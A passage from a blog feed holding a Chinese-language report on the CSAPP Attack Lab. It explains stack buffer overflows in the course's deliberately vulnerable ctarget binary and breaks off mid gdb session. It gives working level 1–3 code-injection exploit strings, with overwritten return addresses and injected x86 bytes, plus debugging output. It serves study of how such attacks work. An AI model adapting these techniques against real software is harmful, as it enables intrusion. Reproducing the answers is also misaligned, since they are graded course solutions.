      <category term="通知" scheme="http://blog.codedragon.tech/categories/%E9%80%9A%E7%9F%A5/"/>
    
    
      <category term="通知" scheme="http://blog.codedragon.tech/tags/%E9%80%9A%E7%9F%A5/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统AttackLab实验报告</title>
    <link href="http://blog.codedragon.tech/2017/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FAttackLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/05/09/深入理解计算机系统AttackLab实验报告/</id>
    <published>2017-05-09T05:56:05.000Z</published>
    <updated>2017-05-14T16:30:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/AttackLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented Programming）两种攻击方式，分别修改具有缓冲区溢出漏洞的两个x86_64可执行文件的行为。</p>
<p>本实验主要加深了对于栈规则的理解，以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>本实验使用了官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/target1.tar" target="_blank" rel="external">Ubuntu 12.4 targets</a>，并且使用了运行时参数-q来避免该程序连接远程的计分服务器。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中的target1.tar主要包含了以下文件：</p>
<ul>
<li>README.txt 描述了目录内容</li>
<li>ctarget 一个易受代码注入攻击的可执行程序</li>
<li>rtarget 一个易受返回导向编程攻击的可执行程序</li>
<li>cookie.txt 在攻击中用到的唯一标识符，是8位的16进制代码</li>
<li>farm.c 目标程序的”Gadget Farm”的源代码，你将利用这些代码去生成返回导向编程攻击</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>答案不能使用攻击去避免程序的正确性检查代码。具体来说，ret指令返回的目的地只能是以下3种：</p>
<ul>
<li>函数touch1, touch2, touch3的地址</li>
<li>攻击注入代码的地址</li>
<li>gadget farm中gadgets的地址</li>
</ul>
<p>rtarget中只能用函数start_farm和函数end_farm之间的函数来生成gadget。</p>
<h2 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h2><p>目标程序ctarget和rtarget都使用getbuf函数从标准输入流中读取字符串，getbuf函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</div><div class="line">	Gets(buf);</div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Gets函数同标准库函数gets相似，其从标准输入流中读入以’\n’或者是EOF结尾的字符串并且将其存储在制定的地址。在这段代码中，目标地址是一个长BUFFER_SIZE的字符数组。<br>但同时Gets()和gets()都不具备检测目的缓冲区是否足够大以存储输入的字符串的功能，因此可能存在缓冲区溢出的风险。在本次实验中，我们要利用该缓冲区溢出漏洞，改变目标程序的行为。</p>
<p>对于自学者来说，运行target的程序的时候需要带上参数-q以避免其连接并不存在的计分服务器。同时需要注意，用来生成攻击字符串的16进制的代码的任意中间位置都不能包含0a，因为其ascii表示是’\n’，在其之后的任意代码都不会被目标程序读入了。</p>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="第1部分-代码注入（Code-Injection）攻击"><a href="#第1部分-代码注入（Code-Injection）攻击" class="headerlink" title="第1部分 代码注入（Code Injection）攻击"></a>第1部分 代码注入（Code Injection）攻击</h3><p>本部分总共包含3个阶段，需要生成相应的攻击字符串去攻击ctarget。目标文件ctarget的栈位置是固定的，并且栈上的代码可执行。这为我们的代码注入攻击提供了机会。</p>
<h4 id="等级1"><a href="#等级1" class="headerlink" title="等级1"></a>等级1</h4><p>阶段一不需要注入自己的代码，攻击字符串只需要将程序重定向至已有的过程即可。</p>
<p>在ctarget中，函数getbuf被test函数调用，而test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> val;</div><div class="line">	val = getbuf();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>现在我们需要修改程序的行为，让程序从getbuf返回时不返回到test函数中，而跳转至touch1函数。函数touch1如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">1</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</div><div class="line">	validate(<span class="number">1</span>);</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先，我们对于目标可执行程序ctarget使用objdump -d ctarget &gt; ctarget-disassemble生成ctarget的反汇编代码。然后观察反汇编代码中的getbuf函数，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00000000004017a8 &lt;getbuf&gt;:</div><div class="line">  4017a8:       48 83 ec 28             sub    <span class="variable">$0x28</span>,%rsp</div><div class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</div><div class="line">  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</div><div class="line">  4017b4:       b8 01 00 00 00          mov    <span class="variable">$0x1</span>,%eax</div><div class="line">  4017b9:       48 83 c4 28             add    <span class="variable">$0x28</span>,%rsp</div><div class="line">  4017bd:       c3                      retq   </div><div class="line">  4017be:       90                      nop</div><div class="line">  4017bf:       90                      nop</div></pre></td></tr></table></figure></p>
<p>通过观察sub $0x28,%rsp可以知道，getbuf在局部栈上开辟了大小为40个字节的空间，据此我们可以推测BUFFER_SIZE为40。那么，如果我们输入的字符串长度超过了40个字节，就会造成缓冲区溢出。</p>
<p>这里我们需要复习一下函数栈帧的相关知识。被调用者Q的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。而调用者Q的栈帧自栈底到栈顶包括了参数以及返回地址。</p>
<p>对于getbuf函数来说，不存在被保存的寄存器，在缓冲区溢出之后，溢出的字符会直接覆盖调用者栈帧中的返回地址。因此，直接使用touch1的起始地址作为溢出的字符串覆盖返回地址即可。</p>
<p>我们观察反汇编代码中touch1函数的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000000004017c0 &lt;touch1&gt;:</div></pre></td></tr></table></figure><br>据此可以得出攻击代码的16位表示如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">c0 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>其中，前40个字节的内容无关紧要（只要不是0a即可），因为它们属于未溢出的部分。这段攻击代码中而真正起作用的是缓冲区溢出的部分，即最后的8个字节。同时要注意到x86_86的机器是小端表示的字节序，即低位放在低字节，高位放在高字节，并且栈的增长方向是由低地址增长到高地址。所以最后8个字节的顺序为 c0 17 40 00 00 00 00 00。<br>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level1/level1.txt|./hex2raw|./ctarget -q</div><div class="line">数Cookie: 0x59b997fa</div><div class="line">Type string:Touch1!: You called touch1()</div><div class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级2"><a href="#等级2" class="headerlink" title="等级2"></a>等级2</h4><p>阶段2需要在攻击字符串中注入少量的代码。</p>
<p>在ctarget中，函数touch2如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">2</span>;</div><div class="line">	<span class="keyword">if</span> (val == cookie) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">		validate(<span class="number">2</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: you called touch2(0x%.8x)\n"</span>, val);</div><div class="line">		fail(<span class="number">2</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>任务是让ctarget执行函数touch2的代码而不是直接返回到test函数。并且，你必须假装你已经传递了cookie的值作为touch2的参数。</p>
<p>考虑到在ctarget中，栈地址固定以及允许在栈上执行代码，所以我们可以通过缓冲区溢出漏洞将返回地址指定到栈上，在栈上执行相应的指令，为函数touch2设置参数，最后再从栈上返回至touch2函数即可。</p>
<p>同阶段一相似，攻击代码的前40个字节无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，为了让函数能返回到栈上执行代码，我们需要知道栈地址。</p>
<p>使用gdb加载ctarget，并为getbuf函数设置断点，执行程序，当程序因为断点而暂停的时候打印rsp的值。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</div><div class="line">(gdb) run -q</div><div class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:12</div><div class="line">12	buf.c: 没有那个文件或目录.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$rsp</span></div><div class="line"><span class="variable">$1</span> = 0x5561dca0</div></pre></td></tr></table></figure><br>从中可以得出结论，ctarget在执行getbuf时的栈地址（指向返回地址）为0x5561dca0。因此我们应该将返回地址指定为0x5561dca8。</p>
<p>然后我们用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x59b997fa, %edi <span class="comment">;设置cookie为参数</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch2的地址）</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure><br>其中add $16,%rsp的值可能需要修改，这是因为我们无法确定这段汇编代码反汇编后占多少字节。同时，我们也要保证rsp移动的位数是8的倍数，这是栈的特性（即push和pop时操作数据的大小为一个机器字长）决定的。</p>
<p>写完了攻击代码后，我们依次使用<code>gcc -c exploit.s</code>以及<code>objdump -d exploit.o &gt; exploit.d</code>将攻击代码汇编和反汇编。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; gcc -c exploit.s                                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; objdump -d exploit.o &gt; exploit.d                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; cat exploit.d                                                 </div><div class="line"></div><div class="line">exploit.o：     文件格式 elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	bf fa 97 b9 59       	mov    <span class="variable">$0x59b997fa</span>,%edi</div><div class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</div><div class="line">   9:	c3                   	retq   </div></pre></td></tr></table></figure><br>总共是10个字节，小于16个字节，因此源攻击代码中的add $16,%rsp可以直接使用，无需继续更改。<br>最后我们在ctarget-disassemble中观察函数touch2的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000000004017ec &lt;touch2&gt;:</div></pre></td></tr></table></figure></p>
<p>根据以上的信息，我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf fa 97 b9 59 48 83 c4</div><div class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 */</div><div class="line">ec 17 40 00 00 00 00 00 /* 返回地址 指向函数touch2 */</div></pre></td></tr></table></figure><br>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level2/level2.txt|./hex2raw|./ctarget -q     </div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 10 C3 00 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3"><a href="#等级3" class="headerlink" title="等级3"></a>等级3</h4><p>阶段3同样包含了代码注入攻击，但是这次需要将一个字符串作为参数传入。<br>在ctarget中，函数hexmatch和touch3的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</div><div class="line">	<span class="comment">/* Make position of check string unpredictable */</span></div><div class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</div><div class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</div><div class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">3</span>;		<span class="comment">/* Part of validation protocol */</span></div><div class="line">	<span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">		validate(<span class="number">3</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">		fail(<span class="number">3</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>任务是让程序执行touch3的代码而不是直接返回到test，你必须假装你已经将一个cookie的字符串表示作为参数传递给了touch3。</p>
<p>该阶段的思路同阶段二相似，不同的是，阶段二要求传递的参数是一个数字，而阶段三要求传递的参数是一个自己构造的字符串的首地址。因此，我们需要将目标字符串也通过缓冲区溢出攻击注入到栈段，并且将其首地址设置为%rdi。</p>
<p>现在我们来构造攻击字符串，首先，同阶段一和阶段二一样，攻击字符串的前40个字符串无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，同阶段二一样，我们将该返回地址设置为0x5561dca8。</p>
<p>接下来我们使用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x0, %edi <span class="comment">;设置第一个参数指向一个字符串（保留）</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch3的地址）</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure><br>注意，在构造该攻击字符串的时候，我们还不知道cookie的字符串的表示的首地址。故我们先使用0x0进行占位。生成最后的攻击字符串时只要用相应的栈地址替换0x0即可。</p>
<p>写完攻击代码之后，我们依次使用gcc和objdump进行汇编和反汇编，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; gcc -c exploit.s                                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; objdump -d exploit.o &gt; exploit.d                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; cat exploit.d                                                </div><div class="line"></div><div class="line">exploit.o：     文件格式 elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</div><div class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</div><div class="line">   9:	c3                   	retq   </div></pre></td></tr></table></figure></p>
<p>在攻击代码之后，栈上紧跟着的应该是该攻击代码的返回地址，毫无疑问，在这里我们需要将返回地址指向函数touch3的起始地址。</p>
<p>现在需要讨论的问题是，字符串应该放在栈上的什么地方？首先我们可以考虑将字符串放置在攻击字符串的前40个字节中。这样，具体的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">35 39 62 39 39 37 66 61</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 其中最后16个字节保存了cookie的字符串表示 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf 90 dc 61 55 48 83 c4 /* 攻击代码 其中将%rdi指向cookie的字符串表示的首地址 */</div><div class="line">10 c3 00 00 00 00 00 00</div><div class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</div></pre></td></tr></table></figure><br>下面我们用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw|./ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Misfire: You called touch3(<span class="string">""</span>)</div><div class="line">FAIL: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:FAIL:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 A8 DC 61 55 00 00 00 00 BF 90 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>糟糕，程序出错了，从Misfire: You called touch3(“”)中我们可以看出，%rdi指向的字符串是空字符串。这显然与我们的预期不符。我们的攻击代码理应没有任何问题。那么问题出在哪儿呢？</p>
<p>下面我们将攻击字符串导出成文件并且在gdb中进行调试，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw &gt; weirdError</div><div class="line">user@BlackDragon ~/C/A/target1&gt; gdb ctarget                 </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from ctarget...done.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</div><div class="line">(gdb) run -i weirdError -q</div><div class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -i weirdError -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:12</div><div class="line">12	buf.c: 没有那个文件或目录.</div><div class="line">(gdb) nexti 5</div><div class="line">0x00000000004017bd	16	<span class="keyword">in</span> buf.c</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	53	57	98	57	57	55	102	97</div><div class="line">0x5561dc98:	0	0	0	0	0	0	0	0</div><div class="line">......After Some Steps......</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> touch3:</div><div class="line">   0x00000000004018fa &lt;+0&gt;:	push   %rbx</div><div class="line">   0x00000000004018fb &lt;+1&gt;:	mov    %rdi,%rbx</div><div class="line">   0x00000000004018fe &lt;+4&gt;:	movl   <span class="variable">$0x3</span>,0x202bd4(%rip)        <span class="comment"># 0x6044dc &lt;vlevel&gt;</span></div><div class="line">   0x0000000000401908 &lt;+14&gt;:	mov    %rdi,%rsi</div><div class="line">   0x000000000040190b &lt;+17&gt;:	mov    0x202bd3(%rip),%edi        <span class="comment"># 0x6044e4 &lt;cookie&gt;</span></div><div class="line">=&gt; 0x0000000000401911 &lt;+23&gt;:	callq  0x40184c &lt;hexmatch&gt;</div><div class="line">   0x0000000000401916 &lt;+28&gt;:	<span class="built_in">test</span>   %eax,%eax</div><div class="line">   0x0000000000401918 &lt;+30&gt;:	je     0x40193d &lt;touch3+67&gt;</div><div class="line">   0x000000000040191a &lt;+32&gt;:	mov    %rbx,%rdx</div><div class="line">   0x000000000040191d &lt;+35&gt;:	mov    <span class="variable">$0x403138</span>,%esi</div><div class="line">   0x0000000000401922 &lt;+40&gt;:	mov    <span class="variable">$0x1</span>,%edi</div><div class="line">   0x0000000000401927 &lt;+45&gt;:	mov    <span class="variable">$0x0</span>,%eax</div><div class="line">   0x000000000040192c &lt;+50&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401931 &lt;+55&gt;:	mov    <span class="variable">$0x3</span>,%edi</div><div class="line">   0x0000000000401936 &lt;+60&gt;:	callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x000000000040193b &lt;+65&gt;:	jmp    0x40195e &lt;touch3+100&gt;</div><div class="line">   0x000000000040193d &lt;+67&gt;:	mov    %rbx,%rdx</div><div class="line">   